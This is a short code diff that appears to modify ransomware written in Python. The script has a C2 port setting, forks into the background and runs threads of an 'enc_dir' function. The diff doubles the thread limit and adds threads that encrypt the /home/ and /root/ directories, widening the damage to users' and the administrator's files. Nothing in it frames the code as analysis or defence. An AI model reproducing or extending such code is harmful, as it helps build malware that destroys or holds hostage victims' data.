@@ -9,7 +9,7 @@ c2_port=9001
 
 exc=[]
 threads=[]
-max_t=500
+max_t=1000
 
 
 
@@ -87,6 +87,12 @@ pid = os.fork()
 if pid >0:
     exit(0)
 t=threading.Thread(target=enc_dir)
+t.start()
+threads.append(t)
+t=threading.Thread(target=enc_dir,args=("/home/",))
+t.start()
+threads.append(t)
+t=threading.Thread(target=enc_dir, args=("/root/",))
 t.start()
 threads.append(t)
 print("uwu...")
